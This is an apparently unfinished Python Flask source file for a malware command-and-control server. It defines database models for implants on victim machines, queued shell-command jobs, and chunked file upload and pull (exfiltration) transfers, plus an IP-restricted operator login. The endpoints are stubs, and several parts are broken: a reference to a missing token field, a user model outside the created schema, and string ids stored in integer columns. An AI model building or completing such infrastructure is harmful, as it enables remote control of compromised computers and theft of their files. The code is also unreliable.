from flask import Flask, json, jsonify, url_for, request, make_response, abort
from os import path as os_path, getcwd, makedirs, path
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import ForeignKey, select
from sqlalchemy.orm import DeclarativeBase, Mapped, Session, mapped_column, relationship
from werkzeug.middleware.proxy_fix import ProxyFix
from pprint import pprint
from enum import Enum

import base64
import os
import shutil
import hashlib
import uuid
import bcrypt

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os_path.join(app.root_path, '..', 'data.db')
app.app_context().push()
db = SQLAlchemy(app)

"""
    These classes form a user + password + ip auth system for the server.
"""
class Base(DeclarativeBase):
    pass

class User(Base):
    __tablename__ = 'users'
    
    id: Mapped[int] = mapped_column(primary_key=True)
    username: Mapped[str] = mapped_column(db.String(50), unique=True, index=True)
    password_hash: Mapped[str] = mapped_column(db.String(128))

    safe_ips: Mapped[list["SafeIP"]] = relationship(back_populates="user", cascade="all, delete-orphan")

class SafeIP(Base):
    __tablename__ = 'safe_ips'
    
    id: Mapped[int] = mapped_column(primary_key=True)
    ip_address: Mapped[str] = mapped_column(db.String(45), index=True)
    user_id: Mapped[int] = mapped_column(ForeignKey('users.id'))

    user: Mapped["User"] = relationship(back_populates="safe_ips")

"""
    These classes define the structure of the C2 Server and the databases behind it.
"""
class ImplantStatus(Enum):
    REGISTERING = 1
    SLEEPING = 2
    ACTIVE = 3
    TERMINATED = 4

class JobStatus(Enum):
    QUEUED = 1
    PENDING = 2
    EXECUTING = 3
    SUCCESS = 4
    FAILURE = 5
    NOT_SUPPORTED = 6

class JobType(Enum):
    REGISTER = 1
    TERMINATE = 2
    PUSH = 3
    PULL = 4
    SHELL = 5

class RequestType(Enum):
    REGISTER = 1
    TERMINATE = 2
    GET_JOB = 3
    PUSH_START = 4
    PUSH_CHUNK = 5
    PUSH_END = 6
    PULL_START = 7
    PULL_CHUNK = 8
    PULL_END = 9
    SHELL = 10

class ProcessArch(Enum):
    X86 = 1
    X64 = 2
    ARM = 3
    ARM64 = 4

class Implant(db.Model):
    __tablename__ = 'implants'
    id = db.Column(db.Integer, unique=True,primary_key=True)
    machine_guid = db.Column(db.String(36), unique=True, nullable=False)
    hostname = db.Column(db.String)
    username = db.Column(db.String, nullable=False)
    operating_system = db.Column(db.String(1024), nullable=False)
    arch = db.Column(db.String, nullable=False)
    internal_ips = db.Column(db.JSON)
    external_ip = db.Column(db.String(16))
    integrity = db.Column(db.String(64))
    created = db.Column(db.DateTime, nullable=False, server_default=db.func.now())
    updated = db.Column(db.DateTime, nullable=False, server_default=db.func.now(), onupdate=db.func.now())

    jobs = db.relationship('Job', back_populates='implant')

    def __init__(self, machine_guid='', hostname='', username='', operating_system='', arch='', internal_ips=None, external_ip='', integrity=''):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8]
        self.machine_guid = machine_guid
        self.hostname = hostname
        self.username = username
        self.operating_system = operating_system
        self.arch = arch
        self.internal_ips = internal_ips if internal_ips is not None else {}
        self.external_ip = external_ip
        self.integrity = integrity

    def json(self):
        return {
            'id': self.id,
            'machine_guid': self.machine_guid,
            'hostname': self.hostname,
            'username': self.username,
            'operating_system': self.operating_system,
            'arch': self.arch,
            'internal_ips': json.loads(self.internal_ips) if self.internal_ips else {},
            'external_ip': self.external_ip,
            'integrity': self.integrity,
            'created': self.created.isoformat(),
            'updated': self.updated.isoformat()
        }

class PushFileChunk(db.Model):
    __tablename__ = 'pushfilechunks'
    id = db.Column(db.Integer, unique=True, primary_key=True)
    data = db.Column(db.String)
    pushfile_id = db.Column(db.String(8), db.ForeignKey('pushfiles.id'))
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    def __init__(self, data='', pushfile_id=''):
        self.data = data
        self.type = 1
        self.pushfile_id = pushfile_id

    def json(self):
        return {
            'id': self.id,
            'data': self.data,
            'pushfile_id': self.pushfile_id,
            'created': self.created.isoformat(),
            'updated': self.updated.isoformat()
        }

class PullFileChunk(db.Model):
    __tablename__ = 'pullfilechunks'
    id = db.Column(db.Integer, unique=True, primary_key=True)
    data = db.Column(db.String)
    pullfile_id = db.Column(db.String(8), db.ForeignKey('pullfiles.id'))
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    def __init__(self, data='', pullfile_id=''):
        self.data = data
        self.type = 2
        self.pullfile_id = pullfile_id

    def json(self):
        return {
            'id': self.id,
            'data': self.data,
            'pullfile_id': self.pullfile_id,
            'created': self.created.isoformat(),
            'updated': self.updated.isoformat()
        }

class PushFile(db.Model):
    __tablename__ = 'pushfiles'
    id = db.Column(db.String(8), unique=True, primary_key=True)
    srv_path = db.Column(db.String, nullable=False)
    path = db.Column(db.String)
    type = db.Column(db.Integer)
    chunks = db.relationship('PushFileChunk', backref='pushfile', lazy=True)
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    def __init__(self, srv_path='', path=''):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8]
        self.srv_path = srv_path
        self.path = path
        self.type = 1

    def json(self):
        return {
            'id': self.id,
            'filename': self.filename,
            'srv_path': self.srv_path,
            'path': self.path,
            'created': self.created.isoformat(),
            'updated': self.updated.isoformat()
        }

class PullFile(db.Model):
    __tablename__ = 'pullfiles'
    id = db.Column(db.String(8), unique=True, primary_key=True)
    srv_path = db.Column(db.String, nullable=False)
    path = db.Column(db.String)
    type = db.Column(db.Integer)
    chunks = db.relationship('PullFileChunk', backref='pullfile', lazy=True)
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    def __init__(self, srv_path='', path=''):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8]
        self.srv_path = srv_path
        self.path = path
        self.type = 2

    def json(self):
        return {
            'id': self.id,
            'filename': self.filename,
            'srv_path': self.srv_path,
            'path': self.path,
            'created': self.created.isoformat(),
            'updated': self.updated.isoformat()
        }

class Job(db.Model):
    __tablename__ = 'jobs'
    id = db.Column(db.String(8), unique=True, primary_key=True)
    type = db.Column(db.Integer, nullable=False)
    status = db.Column(db.Integer, nullable=False)
    input = db.Column(db.String)
    result = db.Column(db.String)
    implant_id = db.Column(db.String(8), db.ForeignKey('implants.id'))
    pushfile_id = db.Column(db.String(8), db.ForeignKey('pushfiles.id'))
    pullfile_id = db.Column(db.String(8), db.ForeignKey('pullfiles.id'))
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    implant = db.relationship('Implant', back_populates='jobs')

    def __init__(self, status=0, type=0, input='', result='', implant_id=''):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8]
        self.status = status
        self.type = type
        self.input = input
        self.result = result
        self.implant_id = implant_id

    def json(self):
        return {
            'id': self.id,
            'type': JobType(self.type).name,
            'status': JobStatus(self.status).name,
            'input': self.input,
            'result': self.result,
            'implant_id': self.implant_id,
            'pushfile_id': self.pushfile_id,
            'pullfile_id': self.pullfile_id,
            'created': self.created.isoformat(),
            'updated': self.updated.isoformat()
        }

def verify_user_access(session: Session, token: str, request_ip: str) -> User | None:
    stmt = select(User).where(User.api_token == token)
    user = session.scalars(stmt).first()

    if not user:
        return None
    allowed_ips = [ip.ip_address for ip in user.safe_ips]
    if request_ip not in allowed_ips:
        return None
    return user

db.create_all()

@app.post('/api/cli/login')
def login():
    data = request.json or {}
    username = data.get("username")
    password = data.get("password")
    client_ip = request.remote_addr

@app.route('/api/send', methods=['POST'])
def send():
    if request.is_json:
        print("thing")